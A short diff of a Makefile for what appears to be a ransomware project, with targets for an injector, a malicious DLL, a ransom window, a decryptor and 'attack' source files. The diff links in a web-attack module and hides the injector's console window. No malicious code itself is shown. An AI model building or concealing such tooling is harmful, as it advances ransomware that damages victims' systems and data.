@@ -27,7 +27,7 @@ LDFLAGS = -static -static-libgcc -static-libstdc++ \
 SHARED_SRC = \
     $(SRC_DIR)/get_relative_path.c \
     $(SRC_DIR)/attack.c \
-    $(SRC_DIR)/attack_crypto.c
+    $(SRC_DIR)/attack_crypto.c \
     $(SRC_DIR)/attack_web.c
 
 RANSOM_WINDOW_SRC = $(SRC_DIR)/ransom_window.c
@@ -57,7 +57,7 @@ $(BAD_DLL): $(DLL_SRC) | $(BUILD_DIR)
 
 # EXEs
 $(INJECTOR_EXE): $(INJECTOR_SRC) | $(BUILD_DIR)
-	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
+	$(CC) $(CFLAGS) -o  $@ $^ -mwindows $(LDFLAGS)
 
 $(DECRYPT_EXE): $(DECRYPT_SRC) | $(BUILD_DIR)
 	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
